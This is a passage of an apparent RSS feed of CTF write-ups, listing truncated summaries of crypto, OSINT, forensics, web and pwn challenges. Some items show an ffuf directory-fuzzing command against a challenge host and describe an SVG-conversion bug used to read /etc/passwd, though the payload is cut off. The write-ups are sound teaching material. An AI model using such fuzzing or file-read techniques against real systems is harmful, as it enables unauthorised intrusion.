from Crypto.Util.number import getPrime, GCD, bytes_to_long from secret import FLAG from random import randint class Crypto: def __init__(self, bits): self.bits = bits self.alpha = 1/9 self.delta = 1/4 self.known = int(self.bits*self.delta) def keygen(self): while True: p, q = [getPrime(self.bits//2) for _ in '__'] self.e = getPrime(int(self.bits*self.alpha)) φ = (p-1)*(q-1) try: dp = pow(self.e, -1, p-1) dq = pow(self.e, -1, q-1) self.</description></item><item><title>Mayday Mayday</title><link>https://7rocky.github.io/en/ctf/other/htb-unictf/mayday-mayday/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-unictf/mayday-mayday/</guid><description>We are given the Python source code to encrypt the flag:
from Crypto.Util.number import getPrime, GCD, bytes_to_long from secret import FLAG from random import randint class Crypto: def __init__(self, bits): self.bits = bits self.alpha = 1/9 self.delta = 1/4 self.known = int(self.bits*self.delta) def keygen(self): while True: p, q = [getPrime(self.bits//2) for _ in '__'] self.e = getPrime(int(self.bits*self.alpha)) φ = (p-1)*(q-1) try: dp = pow(self.e, -1, p-1) dq = pow(self.e, -1, q-1) self.</description></item><item><title>Maze</title><link>https://7rocky.github.io/en/ctf/overthewire/maze/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/overthewire/maze/</guid><description>This is a lab to practice some exploitation techniques, programming and reverse engineering. The lab consists of 9 levels, using a Linux/x86 architecture (all protections are disabled: NX, PIE, canaries, and even ASLR).
To connect to the first level, we are provided with the SSH credentials for maze0.
The initial recognition of the machine tells us that we have some SUID binaries that will be exploited to pass to the next level.</description></item><item><title>Maze of Mist</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/maze-of-mist/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/maze-of-mist/</guid><description>We are given a compressed vmlinuz-linux kernel image, an initramfs.cpio.gz filesystem and a run.sh script:
$ unzip -l pwn_maze_of_mist.zip Archive: pwn_maze_of_mist.zip Length Date Time Name --------- ---------- ----- ---- 0 2024-02-06 09:30 maze_of_mist/ 1347202 2024-02-06 09:29 maze_of_mist/initramfs.cpio.gz 291 2024-02-06 09:26 maze_of_mist/run.sh 12886816 2024-02-06 09:26 maze_of_mist/vmlinuz-linux --------- ------- 14234309 4 files $ unzip pwn_maze_of_mist.zip Archive: pwn_maze_of_mist.zip creating: maze_of_mist/ inflating: maze_of_mist/initramfs.cpio.gz inflating: maze_of_mist/run.sh inflating: maze_of_mist/vmlinuz-linux If we decompress the filesystem, we find a 32-bit binary called target:</description></item><item><title>Micro-CMS v1</title><link>https://7rocky.github.io/en/ctf/hacker101ctf/micro-cms-v1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/hacker101ctf/micro-cms-v1/</guid><description>We have a simple website that allows us to edit and create posts using Markdown:
Let&amp;rsquo;s click on &amp;ldquo;Testing&amp;rdquo;:
Now, we can try to edit the current post. A text area is shown in order to write Markdown code:
Markdown is a markup language similar to HTML but simpler and easier. Furthermore, Markdown supports the use of HTML tags as well. Hence, let&amp;rsquo;s try a Cross-Site Scripting (XSS) payload like:</description></item><item><title>Milkshake</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/milkshake/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/milkshake/</guid><description>We are given an MP3 file called Milkshake.mp3. We can take a look at the printable strings or metadata:
$ file Milkshake.mp3 Milkshake.mp3: Audio file with ID3 version 2.4.0, extended header, contains:MPEG ADTS, layer III, v1, 128 kbps, 44.1 kHz, JntStereo MPEG ADTS, layer III, v1, 128 kbps, 44.1 kHz, JntStereo $ strings -20 Milkshake.mp3 The Neptunes Present-Clones-ADTRCK 000007A5 000006CA 00007311 000075EA 0001A567 0001A567 00008000 00008000 0000005C 0000005CCOMM 000007A5 000006CA 00007311 000075EA 0001A567 0001A567 00008000 00008000 0000005C 0000005CTPE1 Chad Hugo/Pharrell Williams !</description></item><item><title>Mind your Ps and Qs</title><link>https://7rocky.github.io/en/ctf/picoctf/cryptography/mind-your-ps-and-qs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/cryptography/mind-your-ps-and-qs/</guid><description>We are given the output of an RSA encryption:
Decrypt my super sick RSA: c: 240986837130071017759137533082982207147971245672412893755780400885108149004760496 n: 831416828080417866340504968188990032810316193533653516022175784399720141076262857 e: 65537 RSA background RSA works so that, given a message $m$ in decimal format, we can encrypt it as follows:
$$ c = m^e \mod{n} $$ And the decryption needs two more values: $\phi(n) = (p - 1) (q - 1)$ and $d = e^{-1} \mod{\phi(n)}$, so that:
$$ m = c^d \mod{n} $$ Vulnerability The modulus $n$ is quite short, and thus it can be factored easily.</description></item><item><title>Mini Line</title><link>https://7rocky.github.io/en/ctf/htb-challenges/hardware/mini-line/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/hardware/mini-line/</guid><description>We are given a file called firmware.hex that looks like this:
:100154002F6C69622F6C642D6C696E75782E736FC9 :030164002E330037 :10016800040000001400000003000000474E550082 :10017800891BDEC57F0B4D5D5D0569FF4FE7A53423 :04018800F5185E41C7 :10018C00040000001000000001000000474E550064 :10019C00000000000300000002000000000000004E :1001AC000100000001000000010000000000000040 :0801BC0000000000000000003B :1001C400000000000000000000000000000000002B :1001D40000000000780300000000000003000B0092 :1001E40000000000381001000000000003001600A9 :1001F40007000000000000000000000022000000D2 :100204003C0000000000000000000000200000008E :1002140016000000000000000000000012000000B2 :100224005800000000000000000000002000000052 :100234006700000000000000000000002000000033 :100244000100000000000000000000001200000097 :100254000061626F7274005F5F6378615F66696EEC :10026400616C697A65005F5F6C6962635F73746176 :1002740072745F6D61696E006C6962632E736F2EB8 :100284003600474C4942435F322E34005F49544D97 :100294005F64657265676973746572544D436C6F0E :1002A4006E655461626C65005F5F676D6F6E5F734E :1002B400746172745F5F005F49544D5F7265676972 :1002C40073746572544D436C6F6E655461626C65F2 :0102D4000029 :1002D6000000000000000200000002000000000014 :0202E600020014 :1002E80001000100280000001000000000000000CC :1002F8001469690D000002003200000000000000CF :10030800080F0100170000000C0F01001700000083 :100318001C100100170000002C100100170000003D :1003280030100100170000003C1001001700000009 :10033800201001001503000024100100150400001E :1003480028100100150600003410010015070000F0 :100358000C10010016030000101001001605000023 :1003680014100100160600001810010016080000FD :0C03780008402DE9270000EB0880BDE8DC :1003840004E02DE504E09FE50EE08FE008F0BEE513 :100394006C0C010000C68FE210CA8CE26CFCBCE558 :1003A40000C68FE210CA8CE264FCBCE500C68FE292 :1003B40010CA8CE25CFCBCE500C68FE210CA8CE279 :0403C40054FCBCE544 :1003C80000B0A0E300E0A0E304109DE40D20A0E14C :1003D80004202DE504002DE528A09FE524308FE2B8 :1003E80003A08AE020C09FE50CC09AE704C02DE571 :1003F80018309FE503309AE714009FE500009AE75C :10040800E5FFFFEBEAFFFFEBF00B01001C0000002B :100418002C0000003000000014309FE514209FE5F8 :1004280003308FE0022093E7000052E31EFF2F0104 :10043800DCFFFFEAD00B0100280000002C009FE53C :100448002C309FE500008FE003308FE0000053E17F :1004580020309FE503308FE01EFF2F0118209FE515 :10046800023093E7000053E31EFF2F0113FF2FE133 :10047800EC0B0100E80B01009C0B010024000000BC :1004880038009FE538109FE500008FE001108FE0ED :10049800001041E0A13FA0E1411183E024309FE535 :1004A800C110B0E103308FE01EFF2F0118209FE537 :1004B800023093E7000053E31EFF2F0113FF2FE1E3 :1004C800A80B0100A40B01004C0B01003400000034 :1004D8004C309FE54C209FE503308FE00030D3E59A :1004E80002208FE0000053E31EFF2F1138309FE5F4 :1004F80010402DE9033092E7000053E30200000AA0 :1005080028309FE503009FE7A0FFFFEBCAFFFFEB42 :100518001C309FE50120A0E303308FE00020C3E5F5 :100528001080BDE8580B0100100B010020000000EE :10053800280B0100180B0100D0FFFFEA04B02DE5DD :1005480000B08DE20CD04DE20030A0E105304BE563 :1005580050309FE5003093E5FF3CC3E305205BE5A1 :100568000224A0E10210A0E138209FE5013083E1D8 :10057800003082E530309FE50528A0E3002083E5C0 :1005880028309FE50228A0E3002083E51C309FE582 :100598000127A0E3002083E50000A0E100D08BE262 :1005A80004B09DE41EFF2FE1008002E0048002E019 :1005B8000C8002E000482DE904B08DE210D04DE235 :1005C80010000BE50030A0E305304BE5080000EA19 :1005D80005305BE510201BE5033082E00030D3E5F1 :1005E8000300A0E1D4FFFFEB05305BE5013083E2B7 :1005F80005304BE505305BE510201BE5033082E054 :100608000030D3E5000053E3F0FFFF1A0000A0E13B :100618000000A0E104D04BE20088BDE804B02DE55D :1006280000B08DE234309FE5003093E52C209FE543 :10063800153C83E3003082E524309FE52020A0E3C9 :10064800B020C3E11C309FE51020A0E30020C3E5E3 :100658000000A0E100D08BE204B09DE41EFF2FE172 :1006680000C002E0000002E00C0002E004B02DE54A :1006780000B08DE214D04DE20030A0E10D304BE522 :1006880068309FE58020A0E3002083E560209FE597 :100698000D305BE50338A0E12338A0E1B030C2E1BA :1006A8000000A0E14C309FE50030D3E5FF3003E2C5 :1006B800033CA0E1433CA0E1000053E3F8FFFFAA9C :1006C8002C309FE5B030D3E10338A0E12338A0E116 :1006D80005304BE520309FE58020A0E3002083E52E :1006E8000000A0E100D08BE204B09DE41EFF2FE1E2 :1006F8000C8002E0080002E0040002E0048002E04E :1007080000482DE904B08DE230D04DE26C319FE510 :1007180003308FE020C04BE20F0093E80F008CE815 :100728005C319FE524300BE558319FE503308FE0BD :1007380034C04BE20F0093E80700ACE80030CCE58A :1007480044319FE503308FE00300A0E198FFFFEB01 :10075800B1FFFFEB34319FE503308FE00300A0E1E8 :1007680093FFFFEB0100A0E3BFFFFFEB20319FE504 :1007780003308FE00300A0E18DFFFFEB0030A0E322 :1007880008300BE50A0000EA20204BE208301BE5A0 :10079800033082E00030D3E51A3023E2FF3003E271 :1007A8000300A0E1B0FFFFEB08301BE5013083E256 :1007B80008300BE508301BE5100053E3F1FFFFDAC2 :1007C8000030A0E30C300BE50C0000EA24204BE2DB :1007D8000C301BE5033082E00030D3E5A330A0E104 :1007E800FF3003E2393023E2FF3003E20300A0E1E7 :1007F8009DFFFFEB0C301BE5013083E20C300BE56D :100808000C301BE5040053E3EFFFFFDA0030A0E3F0 :1008180010300BE50C0000EA34204BE210301BE5E9 :10082800033082E00030D3E5A330A0E1FF3003E2DB :10083800393023E2FF3003E20300A0E18AFFFFEB37 :1008480010301BE5013083E210300BE510301BE55A :100858000D0053E3EFFFFFDA38309FE503308FE0F8 :100868000300A0E152FFFFEB0000A0E37EFFFFEBD7 :100878000030A0E30300A0E104D04BE20088BDE80B :10088800E00200001A9614CCD402000050020000C6 :10089800500200004802000078010000F0472DE9EE :1008A8004C609FE54C509FE506608FE005508FE057 :1008B800056046E00070A0E10180A0E10290A0E19F :1008C800AAFEFFEB4661B0E1F087BD080040A0E357 :1008D800043095E40920A0E10810A0E10700A0E198 :1008E800014084E233FF2FE1040056E1F7FFFF1ACD :1008F800F087BDE8540601004C0601001EFF2FE1F9 :0809080008402DE90880BDE85C :10091000010002003A0000003D0000000A00000053 :100920003D0000000F0000003D000000240000001A :100930003D000000320000003D0000000200000009 :100940003D000000050000003D0000001300000015 :100950003D0000000D0000003D0000000C00000004 :100960003D000000230000003D00000011000000D9 :100970003D000000260000003D00000001000000D6 :100980003D000000170000003D00000008000000CE :100990003D000000090000003D00000000000000D4 :1009A0000000000053504920496E697469616C6908 :1009B0007A6174696F6E00005374617274206269A9 :1009C00074207365740000005472616E736D6974F5 :1009D00074696E67206461746120746F20736C6148 :1009E0007665000044617461207472616E7366659F :1009F0007220697320636F6D706C657465640000AC :100A0000524E5861782E68294577296E2E766945B1 :100A1000BE98AECC1412BABE103030308800000040 :100A20003A0000003D0000000A0000003D00000008 :100A30000F0000003D000000240000003D00000009 :100A4000320000003D000000020000003D000000F8 :100A5000050000003D000000130000003D00000004 :100A60000D0000003D0000000C0000003D000000F3 :100A7000230000003D000000110000003D000000C8 :100A8000260000003D000000010000003D000000C5 :100A9000170000003D000000080000003D000000BD :100AA000090000003D000000000000000000000000 :080AB00018F9FF7F01000000AE :040AB800000000003A :020000021000EC :040F080040050000A0 :040F0C00D804000005 :100F100001000000280000000C0000007803000021 :100F20000D0000000809000019000000080F010072 :100F30001B000000040000001A0000000C0F01005C :100F40001C00000004000000F5FEFF6FAC01000073 :100F5000050000005402000006000000C40100006B :100F60000A000000810000000B00000010000000DB :100F70001500000000000000030000000010010048 :100F8000020000002000000014000000110000001A :100F900017000000580300001100000008030000C3 :100FA00012000000500000001300000008000000C4 :100FB000FBFFFF6F00000008FEFFFF6FE80200006C :100FC000FFFFFF6F01000000F0FFFF6FD60200007F :100FD000FAFFFF6F060000000000000000000000A4 :100FE0000000000000000000000000000000000001 :100FF00000000000000000000000000000000000F1 :10100000100F010000000000000000008403000039 :10101000840300008403000084030000040900002E :10102000000000000000000000000000A408000014 :081030000807000000000000A9 :08103800000000003C10010063 :04000003000003C82E :00000001FF We only know that this is the firmware of an LPC2148 microcontroller that is sending data.</description></item><item><title>misDIRection</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/misdirection/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/misdirection/</guid><description>We are given a ZIP archive:
$ file misDIRection.zip misDIRection.zip: Zip archive data, at least v1.0 to extract We uncompress it and we see this output:
$ unzip -P hackthebox misDIRection.zip Archive: misDIRection.zip creating: .secret/ creating: .secret/S/ extracting: .secret/S/1 creating: .secret/V/ extracting: .secret/V/35 creating: .secret/F/ extracting: .secret/F/2 extracting: .secret/F/19 extracting: .secret/F/27 creating: .secret/o/ creating: .secret/H/ creating: .secret/A/ creating: .secret/f/ creating: .secret/r/ creating: .secret/m/ creating: .secret/B/ extracting: .secret/B/23 creating: .secret/a/ creating: .</description></item><item><title>Missing in Action</title><link>https://7rocky.github.io/en/ctf/htb-challenges/osint/missing-in-action/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/osint/missing-in-action/</guid><description>We have this challenge description:
Roland Sanchez from Birmingham, UK is missing. The family are convinced he was kidnapped on a business trip. Can you help?
LinkedIn We can start by entering some key words in a search engine:
The first thing that pops out is LinkedIn:
Here we have the company&amp;rsquo;s name: Egotistical Bank.
Twitter If we enter the company&amp;rsquo;s name in a search engine, the first thing that pops out is Twitter:</description></item><item><title>mixup</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/mixup/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/mixup/</guid><description>We are given a flag.txt file that contains some Unicode characters. This is the hexdump of the file:
$ xxd flag.txt 00000000: 69e2 808e 63e2 80ae 74e2 808e 66e2 80ae i...c...t...f... 00000010: 7be2 808e e280 8e75 6e31 6330 e280 ae64 {......un1c0...d 00000020: 655f 6de2 80ae 3467 3163 5f6e 61e2 808e e_m...4g1c_na... 00000030: e280 ae68 e280 8e73 e280 ae64 e280 ae66 ...h...s...d...f 00000040: 6fe2 80ae e280 8e61 7369 e280 8e68 e280 o.</description></item><item><title>Mod 26</title><link>https://7rocky.github.io/en/ctf/picoctf/cryptography/mod-26/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/cryptography/mod-26/</guid><description>We are given a ciphertext:
cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_GYpXOHqX} We see that the message has more or less the format of a picoCTF flag (picoCTF{...}), due to the fact that there are 4 lowercase and 3 uppercase letters before {, and ends with }. Moreover, there are several _.
It seems clear that the encryption is based on a substitution algorithm (Caesar cipher). The most common algorithm is ROT13. Using CyberChef, we can decrypt the message using ROT13 and read the flag:</description></item><item><title>Model E1337 - Rolling Code Lock</title><link>https://7rocky.github.io/en/ctf/hacker101ctf/model-e1337---rolling-code-lock/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/hacker101ctf/model-e1337---rolling-code-lock/</guid><description>We have a simple website that requests a code to unlock:
We can put any number we want, and after a few seconds, we see it is incorrect:
There is nothing in the source code of the website. At this point, we can apply fuzzing to enumerate more routes if they exist:
$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://35.190.155.168/c33a5d03b6/FUZZ admin [Status: 200, Size: 287, Words: 25, Lines: 11] unlock [Status: 405, Size: 178, Words: 20, Lines: 5] [Status: 200, Size: 302, Words: 16, Lines: 13] There is an /admin route:</description></item><item><title>Model E1337 v2 - Hardened Rolling Code Lock</title><link>https://7rocky.github.io/en/ctf/hacker101ctf/model-e1337-v2---hardened-rolling-code-lock/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/hacker101ctf/model-e1337-v2---hardened-rolling-code-lock/</guid><description>This challenge is extremely related to Model E1337 - Rolling Code Lock, specially for the cryptanalysis part. Go and check it if you have not done yet.
As in the previous challenge, we have a simple website that requests a code to unlock:
We can put any number we want and we see it is incorrect:
The difference with the first challenge is the length of the number, this time it is 64-bit long.</description></item><item><title>Money Flowz</title><link>https://7rocky.github.io/en/ctf/htb-challenges/osint/money-flowz/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/osint/money-flowz/</guid><description>We have this challenge description:
Frank Vitalik is a hustler, can you figure out where the money flows?
Reddit First, we can search for the name we have on a search engine:
We are directed to Reddit. Here we can see some posts from Frank Vitalik with some scams:
And this one is a scam to get &amp;ldquo;free coinz&amp;rdquo;:
The next thing to analyze is an Ethereum wallet address.
Ethereum enumeration Especifically, we must go to an Ethereum testnet called Ropsten:</description></item><item><title>Monstrosity</title><link>https://7rocky.github.io/en/ctf/htb-challenges/osint/monstrosity/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/osint/monstrosity/</guid><description>We have this challenge description:
The following social media account is associated with a widespread banking trojan that is silently infecting an increasing number of victims the past few days. There is intense interaction with the aforementioned account right before the self-decryption function of the malicious executable. Investigators around the world are trying to reverse engineer this specific part of the malware with no success so far. Search the account for potential clues that could prove useful.</description></item><item><title>Morse Code</title><link>https://7rocky.github.io/en/ctf/ctflearn/cryptography/morse-code/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/cryptography/morse-code/</guid><description>We are given this sequence of . and -:
-.-. - ..-. .-.. . .- .-. -. ... .- -- ..- . .-.. -- --- .-. ... . .. ... -.-. --- --- .-.. -... -.-- - .... . .-- .- -.-- .. .-.. .. -.- . -.-. .... . . ... As the title of the challenge suggests, it is Morse code. Hence, we must decode the sequence.
We can do it manually: -.</description></item><item><title>MSS</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/mss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/mss/</guid><description>We are given the Python source code of the server:
import os, random, json from hashlib import sha256 from Crypto.Util.number import bytes_to_long from Crypto.Cipher import AES from Crypto.Util.Padding import pad from secret import FLAG class MSS: def __init__(self, BITS, d, n): self.d = d self.n = n self.BITS = BITS self.key = bytes_to_long(os.urandom(BITS//8)) self.coeffs = [self.key] + [bytes_to_long(os.urandom(self.BITS//8)) for _ in range(self.d)] def poly(self, x): return sum([self.coeffs[i] * x**i for i in range(self.</description></item><item><title>MSS</title><link>https://7rocky.github.io/en/ctf/other/htb-unictf/mss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-unictf/mss/</guid><description>We are given the Python source code of the server:
import os, random, json from hashlib import sha256 from Crypto.Util.number import bytes_to_long from Crypto.Cipher import AES from Crypto.Util.Padding import pad from secret import FLAG class MSS: def __init__(self, BITS, d, n): self.d = d self.n = n self.BITS = BITS self.key = bytes_to_long(os.urandom(BITS//8)) self.coeffs = [self.key] + [bytes_to_long(os.urandom(self.BITS//8)) for _ in range(self.d)] def poly(self, x): return sum([self.coeffs[i] * x**i for i in range(self.</description></item><item><title>MSS Revenge</title><link>https://7rocky.github.io/en/ctf/other/htb-unictf/mss-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-unictf/mss-revenge/</guid><description>This challenge is the same as MSS, with a patched unintended solution.
Review of the challenge The server creates a polynomial with random 256-bit coefficients:
$$ P(x) = \mathrm{key} + a_1 x + a_2 x^2 + \dots + a_{30} x^{30} $$ The objective is to find $\mathrm{key}$, which is used to derive an AES key to encrypt the flag. The server allows us to evaluate the polynomial 19 times with values of $0 &amp;lt; x \leqslant 2^{15}$.</description></item><item><title>Multipage Recyclings</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/multipage-recyclings/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/multipage-recyclings/</guid><description>We are provided with the server source code in Python:
from Crypto.Cipher import AES from Crypto.Util.Padding import pad import random, os FLAG = b'HTB{??????????????????????}' class CAES: def __init__(self): self.key = os.urandom(16) self.cipher = AES.new(self.key, AES.MODE_ECB) def blockify(self, message, size): return [message[i:i + size] for i in range(0, len(message), size)] def xor(self, a, b): return b''.join([bytes([_a ^ _b]) for _a, _b in zip(a, b)]) def encrypt(self, message): iv = os.urandom(16) ciphertext = b'' plaintext = iv blocks = self.</description></item><item><title>Multipage Recyclings</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/multipage-recyclings/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/multipage-recyclings/</guid><description>We are provided with the server source code in Python:
from Crypto.Cipher import AES from Crypto.Util.Padding import pad import random, os FLAG = b'HTB{??????????????????????}' class CAES: def __init__(self): self.key = os.urandom(16) self.cipher = AES.new(self.key, AES.MODE_ECB) def blockify(self, message, size): return [message[i:i + size] for i in range(0, len(message), size)] def xor(self, a, b): return b''.join([bytes([_a ^ _b]) for _a, _b in zip(a, b)]) def encrypt(self, message): iv = os.urandom(16) ciphertext = b'' plaintext = iv blocks = self.</description></item><item><title>Mutation Lab</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/mutation-lab/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/mutation-lab/</guid><description>We are given a website like this:
We must register a new account and login to view a nice dashboard:
The only functionality we have is to export the SVG images we see as PNG files. We can capture the request with Burp Suite:
After some research, we can see that there is a vulnerability regarding SVG conversion that leads to Local File Read (more information at security.snyk.io).
We will need to use the following payload to read /etc/passwd as a PNG image:</description></item><item><title>nehebkaus trap</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/nehebkaus-trap/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/nehebkaus-trap/</guid><description>We are given a remote instance to connect to:
$ nc 167.71.143.44 32139 __ {00} \__/ /^/ ( ( \_\_____ (_______) (_________()Ooo. [ Nehebkau's Trap ] You are trapped! Can you escape? &amp;gt; Basic recognition We are allowed to enter some information, but it shows an error:
&amp;gt; asdf [*] Input accepted! Error: name 'asdf' is not defined The error message looks familiar to a Python REPL:
$ python3 -q &amp;gt;&amp;gt;&amp;gt; asdf Traceback (most recent call last): File "</description></item><item><title>Nice netcat...</title><link>https://7rocky.github.io/en/ctf/picoctf/general-skills/nice-netcat.../</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/general-skills/nice-netcat.../</guid><description>We are given host and a port for a remote instance. If we stablish a connection using nc we get a bunch of numbers:
$ nc mercury.picoctf.net 22902 112 105 99 111 67 84 70 123 103 48 48 100 95 107 49 116 116 121 33 95 110 49 99 51 95 107 49 116 116 121 33 95 100 51 100 102 100 54 100 102 125 10 ^C These numbers seem to be the ASCII decimal representation of some characters.</description></item><item><title>Nightmare</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/nightmare/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/nightmare/</guid><description>We are given a 64-bit binary called nightmare:
Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Reverse engineering Using Ghidra, we can read the decompiled source code in C. This is the main function:
void main() { char option; int option_char; setup(); do { while (true) { while (true) { menu(); option_char = getchar(); option = (char)option_char; getchar(); if (option != '3') break; puts("Seriously? We told you that it\'s impossible to exit!</description></item><item><title>No Place To Hide</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/no-place-to-hide/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/no-place-to-hide/</guid><description>We are given these log files from a Windows RDP session:
$ file Cache0000.bin Cache0000.bin: data $ file bcache24.bmc bcache24.bmc: empty $ du -h Cache0000.bin bcache24.bmc 17M	Cache0000.bin 0B	bcache24.bmc And this is the description of the challenge:
We found evidence of a password spray attack against the Domain Controller, and identified a suspicious RDP session. We&amp;rsquo;ll provide you with our RDP logs and other files. Can you see what they were up to?</description></item><item><title>No Return</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/no-return/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/no-return/</guid><description>We are given a 64-bit binary called no-return:
Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Reverse engineering The binary is statically compiled and is so small that we can print the full assembly here:
$ objdump -M intel -d no-return no-return: file format elf64-x86-64 Disassembly of section .text: 0000000000401000 &amp;lt;.text&amp;gt;: 401000: 5c pop rsp 401001: 5f pop rdi 401002: 5e pop rsi 401003: 5d pop rbp 401004: 5a pop rdx 401005: 59 pop rcx 401006: 5b pop rbx 401007: 48 31 c0 xor rax,rax 40100a: ff 67 01 jmp QWORD PTR [rdi+0x1] 40100d: 48 ff c0 inc rax 401010: de f1 fdivrp st(1),st 401012: ff 22 jmp QWORD PTR [rdx] 401014: 48 2b 74 24 10 sub rsi,QWORD PTR [rsp+0x10] 401019: f5 cmc 40101a: ff 22 jmp QWORD PTR [rdx] 40101c: 48 89 e1 mov rcx,rsp 40101f: fd std 401020: ff 22 jmp QWORD PTR [rdx] 401022: 48 8d 0c d9 lea rcx,[rcx+rbx*8] 401026: fd std 401027: ff 21 jmp QWORD PTR [rcx] 401029: 48 31 d5 xor rbp,rdx 40102c: 0f 95 c4 setne ah 40102f: ff a5 00 00 44 e8 jmp QWORD PTR [rbp-0x17bc0000] 401035: 48 01 f4 add rsp,rsi 401038: de f9 fdivp st(1),st 40103a: ff 22 jmp QWORD PTR [rdx] 40103c: 48 01 dd add rbp,rbx 40103f: 9b fwait 401040: ff 65 c7 jmp QWORD PTR [rbp-0x39] 401043: 88 a7 00 00 44 e8 mov BYTE PTR [rdi-0x17bc0000],ah 401049: f9 stc 40104a: ff 22 jmp QWORD PTR [rdx] 40104c: 59 pop rcx 40104d: 48 89 d1 mov rcx,rdx 401050: 5a pop rdx 401051: ff 21 jmp QWORD PTR [rcx] 401053: 48 ff c1 inc rcx 401056: de f1 fdivrp st(1),st 401058: ff 22 jmp QWORD PTR [rdx] 40105a: 48 92 xchg rdx,rax 40105c: de f9 fdivp st(1),st 40105e: ff 21 jmp QWORD PTR [rcx] 401060: 48 ff c3 inc rbx 401063: de f1 fdivrp st(1),st 401065: ff 22 jmp QWORD PTR [rdx] 401067: 48 87 cf xchg rdi,rcx 40106a: fd std 40106b: ff 22 jmp QWORD PTR [rdx] 40106d: 54 push rsp 40106e: 48 31 c0 xor rax,rax 401071: 48 ff c0 inc rax 401074: 48 31 ff xor rdi,rdi 401077: 48 ff c7 inc rdi 40107a: 48 89 e6 mov rsi,rsp 40107d: ba 08 00 00 00 mov edx,0x8 401082: 0f 05 syscall 401084: 48 81 ee b0 00 00 00 sub rsi,0xb0 40108b: 48 31 c0 xor rax,rax 40108e: 48 31 ff xor rdi,rdi 401091: 48 8d 36 lea rsi,[rsi] 401094: ba c0 00 00 00 mov edx,0xc0 401099: 0f 05 syscall 40109b: 48 83 c4 08 add rsp,0x8 40109f: ff 64 24 f8 jmp QWORD PTR [rsp-0x8] This time, the binary is just built for exploitation, there is no realistic functionality.</description></item><item><title>Noisy CRC</title><link>https://7rocky.github.io/en/ctf/other/sekai-ctf/noisy-crc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/sekai-ctf/noisy-crc/</guid><description>We are given the Python source code of the server:
